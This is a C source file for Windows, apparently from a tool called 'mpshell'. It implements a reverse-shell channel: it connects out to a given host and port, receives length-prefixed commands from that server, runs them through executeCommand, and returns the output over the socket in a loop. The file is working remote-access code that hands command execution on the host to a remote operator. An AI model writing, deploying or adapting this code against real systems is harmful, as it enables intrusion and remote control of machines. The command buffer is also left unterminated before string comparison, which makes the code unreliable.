#ifndef WIN32_LEAN_AND_MEAN
  #define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#include "mpshell.h"

extern bool RUN;

/* --------------------------------------------------------------------------------------------------------------- */

void openTCPChannel(const char *host, const char *port)
{

    int status;
    WSADATA wsaData;
    SOCKET sockfd = INVALID_SOCKET;
    struct addrinfo *result = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    ssize_t totalBytesSent;
    ssize_t numBytesSent;
    ssize_t totalBytesRead;
    ssize_t numBytesRead;


    // Initializing WinSock
    // --------------------
    status = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (status != 0)
    {
        printf("[ERROR] WSAStartup failed => %d\n", status);
        exit(EXIT_FAILURE);
    }


    // Resolving server address
    // ------------------------
    status = getaddrinfo(host, port, &hints, &result);
    if (status != 0)
    {
        printf("[ERROR] getaddrinfo failed => %d\n", status);
        WSACleanup();
        exit(EXIT_FAILURE);
    }


    // Creating a socket
    // -----------------
    sockfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (sockfd == INVALID_SOCKET)
    {
        printf("[ERROR] => socket creation failed: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        exit(EXIT_FAILURE);
    }


    // Connecting to server
    // -------------------
    status = connect(sockfd, result->ai_addr, (int)result->ai_addrlen);
    if (status == SOCKET_ERROR)
    {
        printf("[ERROR] Could not connect to server => ");
        closesocket(sockfd);
        freeaddrinfo(result);
        WSACleanup();
        exit(EXIT_FAILURE);
    }


    // Initiating buffers
    // ------------------
    struct ResultBuffer *resultBuffer = (struct ResultBuffer *) malloc(sizeof(struct ResultBuffer));
    resultBuffer->data                = (unsigned char *) malloc(INITIAL_MALLOC_SIZE);
    resultBuffer->currentReadPosition = 0;
    resultBuffer->numBytesOccupied    = 0;
    resultBuffer->numBytesAllocated   = INITIAL_MALLOC_SIZE;


    // Main loop
    // ---------
    while (RUN)
    {

        /* ------------------------------------------------------------------------------------- */

        // Read command from the server
        // ----------------------------
        uint32_t temp;
        if ((recv(sockfd, &temp, 4, 0)) < 4)
            break;

        totalBytesRead         = 0;
        numBytesRead           = 0;
        uint32_t commandLength = ntohl(temp);
        char command[commandLength+5];
        while (totalBytesRead < commandLength)
        {
            numBytesRead = recv(sockfd, &command[totalBytesRead], (commandLength-totalBytesRead), 0);
            if (numBytesRead > 0)
                totalBytesRead += numBytesRead;
        }

        /* ------------------------------------------------------------------------------------- */

        // Run the command
        // ---------------
        if ((strcmp(command, "quit") == 0) || (strcmp(command, "exit") == 0))
            break;

        executeCommand(command, resultBuffer);

        /* ------------------------------------------------------------------------------------- */

        // Send the result back to server
        // ------------------------------
        uint32_t resultLength = htonl(resultBuffer->numBytesOccupied);
        if ((send(sockfd, &resultLength, 4, 0)) < 4)
            break;

        totalBytesSent = 0;
        numBytesSent   = 0;
        while (totalBytesSent < resultBuffer->numBytesOccupied)
        {
            numBytesSent = send(sockfd, &resultBuffer->data[totalBytesSent], ((resultBuffer->numBytesOccupied)-totalBytesSent), 0);
            if (numBytesSent > 0)
                totalBytesSent += numBytesSent;
        }

        resultBuffer->numBytesOccupied = 0;
    }

    free(resultBuffer->data);
    free(resultBuffer);
    closesocket(sockfd);
    freeaddrinfo(result);
    WSACleanup();
}

/* --------------------------------------------------------------------------------------------------------------- */
